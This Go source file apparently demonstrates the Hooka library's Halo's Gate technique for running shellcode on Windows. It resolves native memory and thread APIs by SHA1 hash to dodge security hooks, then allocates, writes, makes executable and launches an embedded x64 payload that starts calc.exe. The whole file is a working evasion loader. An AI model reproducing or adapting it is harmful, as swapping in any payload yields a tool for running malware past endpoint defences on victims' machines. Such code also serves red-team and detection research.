package main

import (
	"crypto/sha1"
	"fmt"
	"github.com/D3Ext/Hooka/pkg/hooka"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

var calc_shellcode []byte = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3}

// Convert string to sha1 (used for hashing)
func StrToSha1(str string) string {
	h := sha1.New()
	h.Write([]byte(str))
	bs := h.Sum(nil)

	return fmt.Sprintf("%x", bs)
}

func main() {
	// 04262a7943514ab931287729e862ca663d81f515 --> StrToSha1("NtAllocateVirtualMemory")
	NtAllocateVirtualMemory, _, err := hooka.HalosFuncFromHash("04262a7943514ab931287729e862ca663d81f515", StrToSha1)
	if err != nil {
		log.Fatal(err)
	}

	// 6caed95840c323932b680d07df0a1bce28a89d1c --> StrToSha1("NtWriteVirtualMemory")
	NtWriteVirtualMemory, _, err := hooka.HalosFuncFromHash("6caed95840c323932b680d07df0a1bce28a89d1c", StrToSha1)
	if err != nil {
		log.Fatal(err)
	}

	// 059637f5757d91ad1bc91215f73ab6037db6fe59 --> StrToSha1("NtProtectVirtualMemory")
	NtProtectVirtualMemory, _, err := hooka.HalosFuncFromHash("059637f5757d91ad1bc91215f73ab6037db6fe59", StrToSha1)
	if err != nil {
		log.Fatal(err)
	}

	// 91958a615f982790029f18c9cdb6d7f7e02d396f --> StrToSha1("NtCreateThreadEx")
	NtCreateThreadEx, _, err := hooka.HalosFuncFromHash("91958a615f982790029f18c9cdb6d7f7e02d396f", StrToSha1)
	if err != nil {
		log.Fatal(err)
	}

	var addr uintptr
	regionsize := uintptr(len(calc_shellcode))

	fmt.Println("[*] Calling NtAllocateVirtualMemory...")
	r1, err := hooka.Syscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE,
	)
	if r1 != 0 {
		log.Fatal(err)
	}

	fmt.Println("[*] Calling NtWriteVirtualMemory...")
	hooka.Syscall(
		NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&calc_shellcode[0])),
		uintptr(len(calc_shellcode)),
		0,
	)

	fmt.Println("[*] Calling NtProtectVirtualMemory...")
	var oldProtect uintptr
	r2, err := hooka.Syscall(
		NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r2 != 0 {
		log.Fatal(err)
	}

	fmt.Println("[*] Calling NtCreateThreadEx...")
	var hhosthread uintptr
	r3, err := hooka.Syscall(
		NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)

	fmt.Println("[*] Executing shellcode...")
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

	if r3 != 0 {
		log.Fatal(err)
	}

	fmt.Println("[+] Shellcode has been executed!")
}
